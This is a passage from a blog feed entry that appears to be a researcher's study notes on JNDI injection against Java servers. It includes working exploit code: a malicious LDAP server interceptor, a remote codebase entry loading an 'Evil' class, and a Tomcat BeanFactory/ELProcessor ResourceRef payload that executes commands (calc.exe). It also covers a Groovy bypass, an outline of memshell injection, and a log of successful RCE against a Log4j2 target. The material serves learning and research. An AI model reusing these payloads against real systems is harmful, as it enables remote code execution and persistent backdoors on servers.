codebase.<br>The resolving codebase functionality is deprecated in JDK9 and deleted in JDK11.<br><em>(The code in this section are written with JDK7u21)</em></p></blockquote><p>Build a Referencable entry(combine with next section).</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(baseDN);  </span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;xxx&quot;</span>);  </span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);  </span><br><span class="line">entry.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);  </span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, Evil.class.getName());  </span><br><span class="line">  </span><br><span class="line">result.sendSearchEntry(entry);  </span><br><span class="line">result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br></pre></td></tr></table></figure><p>When request the LDAP entry:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.lookup(<span class="string">&quot;ldap://0.0.0.0:2389/ref&quot;</span>);</span><br></pre></td></tr></table></figure><p>A http request will made to <em>codebase</em>, client will download and define the <code>Evil</code> class. Any static code block in <code>Evil</code> will be executed on client.</p><h4 id="LDAP-Interceptor"><a href="#LDAP-Interceptor" class="headerlink" title="LDAP Interceptor"></a>LDAP Interceptor</h4><p>The <code>InMemoryOperationInterceptor</code> class can intercept the process either between receiving requests and reaching the LDAP server, or after processed by LDAP server and before sending result to client.<br>Its <code>processSearchResult()</code> method defines the action before replying to client. We can intercept all results from LDAP server and take easy to return a newly defined <code>Entry</code>.<br>Example:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line">  </span><br><span class="line">    System.out.println(String.format(<span class="string">&quot;Request: %s&quot;</span>, base));  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (base.toLowerCase().startsWith(<span class="string">&quot;ser&quot;</span>)) &#123;  </span><br><span class="line">        processSerializable(result);  </span><br><span class="line">        <span class="keyword">return</span>;    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (base.toLowerCase().startsWith(<span class="string">&quot;ref&quot;</span>)) &#123;  </span><br><span class="line">        processReferencable(result);  </span><br><span class="line">        <span class="keyword">return</span>;    &#125;  </span><br><span class="line">  </span><br><span class="line">    System.out.println(String.format(<span class="string">&quot;Request for %s fail&quot;</span>, base));  </span><br><span class="line">result.sendSearchEntry(entry);</span><br><span class="line">    result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">2</span>, ResultCode.NO_OPERATION));  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="JNDI-Injection-Bypass"><a href="#JNDI-Injection-Bypass" class="headerlink" title="JNDI Injection Bypass"></a>JNDI Injection Bypass</h1><blockquote><p>After JDK8u191, the remote resolving codebase functionality of LDAP and RMI is disabled by default. So we need to bypass this restriction.</p></blockquote><h2 id="Bypass-using-ObjectFactory-1"><a href="#Bypass-using-ObjectFactory-1" class="headerlink" title="Bypass using ObjectFactory[^1]"></a>Bypass using <code>ObjectFactory</code>[^1]</h2><h3 id="Tomcat-Bypass-using-BeanFactory"><a href="#Tomcat-Bypass-using-BeanFactory" class="headerlink" title="Tomcat Bypass using BeanFactory"></a>Tomcat Bypass using <code>BeanFactory</code></h3><blockquote><p>[!NOTE] pre-requirements<br>Tomcat &lt; 8.5.79<br>This vul is repaired in 8.5.79, changelog:<br><em>Disable the <code>forceString</code> option for the JNDI <code>BeanFactory</code> and replace it with an automatic search for an alternative setter with the same name that accepts a <code>String</code>. This is a security hardening measure. (markt)</em></p></blockquote><p>We can specify an arbitrary factory class in the <code>javaFactory</code> attribute.<br>This class will be used to extract the read object from the attacker’s controlled <code>Reference</code> object. It should exist in the target classpath, implement <code>ObjectFactory</code> and has at least one <code>getObjectInstance</code> method.<br>The <code>BeanFactory</code> class within Apache Tomcat Server contains a logic for bean creation by using reflection. The target class should have a public no-argument constructor and public setter with only one <code>String</code> parameter. In fact, <code>BeanFactory</code> contains some logic surrounding how we can specify an arbitrary setter name.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);  </span><br><span class="line">Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">String value;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;  </span><br><span class="line">    value = (String)ra.getContent();  </span><br><span class="line">    Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];  </span><br><span class="line">    paramTypes[<span class="number">0</span>] = String.class;  <span class="comment">// only modified here</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;  </span><br><span class="line">    param = param.trim();  </span><br><span class="line">    index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">        setterName = param.substring(index + <span class="number">1</span>).trim();  </span><br><span class="line">        param = param.substring(<span class="number">0</span>, index).trim();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        setterName = <span class="string">&quot;set&quot;</span> +  </span><br><span class="line">                     param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +  </span><br><span class="line">                     param.substring(<span class="number">1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        forced.put(param,  </span><br><span class="line">                   beanClass.getMethod(setterName, paramTypes));  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException|SecurityException ex) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>  </span><br><span class="line">            (<span class="string">&quot;Forced String setter &quot;</span> + setterName +  </span><br><span class="line">             <span class="string">&quot; not found for property &quot;</span> + param);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Consider a “forceString” with content “x&#x3D;eval”, “eval” will become the setter name, the map <code>forced</code> will result in <code>&quot;x&quot;: Method(xx.eval)</code>.<br>Next, <code>BeanFactory</code> extracts all references and finally invoke the setter.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"><span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">ra = e.nextElement();  </span><br><span class="line"><span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType(); </span><br><span class="line">value = (String)ra.getContent();  </span><br><span class="line">Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];  </span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line"><span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;  </span><br><span class="line">    valueArray[<span class="number">0</span>] = value;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        method.invoke(bean, valueArray);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException|  </span><br><span class="line">             IllegalArgumentException|  </span><br><span class="line">             InvocationTargetException ex) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>  </span><br><span class="line">            (<span class="string">&quot;Forced String setter &quot;</span> + method.getName() +  </span><br><span class="line">             <span class="string">&quot; threw exception for property &quot;</span> + propName);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">continue</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So we can include a string reference to the evil reference with attribute type “x” and put EL expression in the content. As a result, the <code>propName</code> will be “x” and <code>valueArray</code> will contain our EL expression. </p><p>We are writing our own malicious LDAP server (or RMI) that responds with a crafted <code>ResourceRef</code> object:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payloadTemplate</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;.eval(\&quot;&#123;replacement&#125;\&quot;)&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,  </span><br><span class="line">        <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, payloadTemplate.replace(<span class="string">&quot;&#123;replacement&#125;&quot;</span>, <span class="string">&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc.exe&#x27;]).start()&quot;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>();</span><br><span class="line">e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;java.lang.String&quot;</span>); <span class="comment">//could be any</span></span><br><span class="line">e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Util.serialize(ref));</span><br><span class="line"></span><br><span class="line">result.sendSearchEntry(e);</span><br><span class="line">result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br></pre></td></tr></table></figure><h3 id="Bypass-using-Groovy"><a href="#Bypass-using-Groovy" class="headerlink" title="Bypass using Groovy"></a>Bypass using Groovy</h3><p>Use the same method as [[#Tomcat Bypass using <code>BeanFactory</code>|ELProcessor]], ELProcessor can be replaced by Groovy, but this require the target to include Groovy in classpath.<br>We can exploit by using the method <code>evaluate</code> within <code>groovy.lang.GroovyShell</code> to execute arbitrary Groovy shell code:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;cmd&#x27;</span>,<span class="string">&#x27;/C&#x27;</span>, <span class="string">&#x27;calc.exe&#x27;</span>].execute();</span><br></pre></td></tr></table></figure><h3 id="Bypass-using-LDAP-Serialized-Object"><a href="#Bypass-using-LDAP-Serialized-Object" class="headerlink" title="Bypass using LDAP Serialized Object"></a>Bypass using LDAP Serialized Object</h3><p>We can use LDAP serialized object entry to contain malicious gadgets. If the client has the vulnerable class in classpath, we will perform a deserialization attack. There is no JDK version restriction on this bypass method.</p><hr><h1 id="JNDI-exploit-tool"><a href="#JNDI-exploit-tool" class="headerlink" title="JNDI exploit tool"></a>JNDI exploit tool</h1><blockquote><p>*Imagine you have found a log4j2 deserializable  vulnerability of an API, you can make the victim server to request an arbitrary JNDI URI, you want to inject a memshell using this breach. *</p></blockquote><h2 id="Structure-and-steps-take-JNDIExploit-project-as-example"><a href="#Structure-and-steps-take-JNDIExploit-project-as-example" class="headerlink" title="Structure and steps(take JNDIExploit project as example)"></a>Structure and steps(take <code>JNDIExploit</code> project as example)</h2><p>In general, a JNDI exploit tool can divide into three parts: </p><ul><li>Choose the way to inject evil class:<ul><li>By register LDAP <code>javaSerializedData</code> entry and directly upload serialized evil class</li><li>By LDAP <code>codebase</code>, remote requesting evil class file</li><li>Using <code>BeanFactory</code> vulnerability, load evil class bytes by <code>EL</code> expression</li></ul></li><li>Define evil class (namely, the memshell loader):<ul><li>Memshell loader should load memshell byte code by reflectively call <code>defineClass</code> method of classloader in current context.</li></ul></li><li>Choose the type of memshell:<ul><li>e.g. by Tomcat Filter&#x2F;Servlet&#x2F;Valve&#x2F;Listener, or Spring Interceptor&#x2F;Controller, etc.</li></ul></li></ul><h3 id="Using-BeanFactory-vul-to-inject-memshell"><a href="#Using-BeanFactory-vul-to-inject-memshell" class="headerlink" title="Using BeanFactory vul to inject memshell"></a>Using <code>BeanFactory</code> vul to inject memshell</h3><p>Exploit <code>BeanFacotory</code>‘s vul, we can execute arbitrary EL expression by <code>ELProcessor</code>, but only one EL sentence would be run. So we should pack the evil class loader into JavaScript and execute JS code by JavaScript engine.</p><hr><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><h2 id="Process-of-JNDI-injection-and-Deserialization"><a href="#Process-of-JNDI-injection-and-Deserialization" class="headerlink" title="Process of JNDI injection and Deserialization"></a>Process of JNDI injection and Deserialization</h2><p>JNDI injection covers the exploitation of deserialization. The following is the conclusion of how to inject memshell by using JNDI injection and deserialization vuls.</p><ol><li><p>Deserialization</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Kick-off: a vulnerable readObject()</span><br><span class="line">Sink: run arbitrary code by</span><br><span class="line">define a new class from byte array and construct new instance. e.g. TemplatesImpl</span><br><span class="line">inject memshell in static code block or constructor</span><br><span class="line">define memshell class from byte array</span><br><span class="line">obtain Request object </span><br><span class="line">inject memshell into context</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>JNDI injection</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Kick-off: a vulnerable lookup()</span><br><span class="line">Sink: </span><br><span class="line">Serialzable: same as deserialization vul</span><br><span class="line">Referencable: </span><br><span class="line">remote classloading</span><br><span class="line">bypass using BeanFactory:</span><br><span class="line">use script engine, e.g. ELProcessor, JavaScript, Groovy, BeanShell</span><br><span class="line">construct script:</span><br><span class="line">define an evil class from byte array</span><br><span class="line">inject memshell in static code block or constructor, e.g. TomcatMemshellTemplate1</span><br><span class="line">define memshell class from byte array</span><br><span class="line">obtain Request object </span><br><span class="line">inject memshell into context</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="Journal"><a href="#Journal" class="headerlink" title="Journal"></a>Journal</h1><h2 id="JNDIExploit-functions-test-on-Log4j2-vul"><a href="#JNDIExploit-functions-test-on-Log4j2-vul" class="headerlink" title="JNDIExploit functions test on Log4j2 vul"></a>JNDIExploit functions test on Log4j2 vul</h2><blockquote><p><em>As for spring web server, those payload targeted to tomcat would lose efficiency</em></p></blockquote><blockquote><p><code>TomcatBypass</code> use <code>BeanFactory</code> to execute payload<br><code>Basic</code> would remote request payload</p></blockquote><ul><li><code>TomcatBypass/SpringMemshell</code>: successfully rce</li><li><code>TomcatBypass/TomcatMemshell</code>: fail</li><li><code>TomcatBypass/GodzillaMemshell</code>: success</li><li><code>Basic/SpringMemshell</code>: fail</li><li><code>Deserilization/Jre8u20/SpringMemshell</code>: fail</li></ul><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> Reproduce Tomcat memshell, Filter&#x2F;Listener&#x2F;Valve</li><li><input checked="" disabled="" type="checkbox"> Explore Spring source code, reproduce Spring memshell</li><li><input disabled="" type="checkbox"> Reproduce java agent memshell</li><li><input checked="" disabled="" type="checkbox"> Explore deserializable entry points: LDAP <code>codebase</code>, <code>javaSerializeData</code>, <code>BeanFactory</code> vul, common gadgets; Read source code of <code>ysoserial</code>, reproduce exploitation of gadgets</li><li><input checked="" disabled="" type="checkbox"> Explore methods to load payload’s byte code, <code>ASM</code>, <code>ClassWriter</code></li><li><input checked="" disabled="" type="checkbox"> Learn <code>Instrument</code> and <code>javassit</code></li><li><input disabled="" type="checkbox"> Explore <code>JNDI-Inject-Tool</code> and <code>JYso</code> tool.</li><li><input disabled="" type="checkbox"> Research how to inject tomcat memshell via deserialization vul<ul><li><input checked="" disabled="" type="checkbox"> Failed to echo by dynamically generating evil class in <code>TomcatEcho</code>. Try loading the byte code of compiled evil class and modify <code>Gadgets.createTemplatesImpl</code></li><li><input checked="" disabled="" type="checkbox"> Echo header </li><li><input disabled="" type="checkbox"> Inject memshell</li></ul></li><li><input disabled="" type="checkbox"> Research agent memshell in <code>JNDIExploit</code></li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[^1]: <a href="https://tttang.com/archive/1405/#toc_0x02-xxe-rce">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖</a></p><p>[^2]: <a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">半自动化挖掘request实现多种中间件回显 | 回忆飘如雪</a><br>[^3]: <a href="https://www.secpulse.com/archives/200930.html">Java反序列化回显学习之Tomcat通用回显 - SecPulse.COM | 安全脉搏</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Repo&quot;&gt;&lt;a href=&quot;#Repo&quot; class=&quot;headerlink&quot; title=&quot;Repo&quot;&gt;&lt;/a&gt;Repo&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/PadishahIII/Spring-Memshell&quot;&gt;Sprin</summary>
      
    
    
    
    
  </entry>
  
</feed>
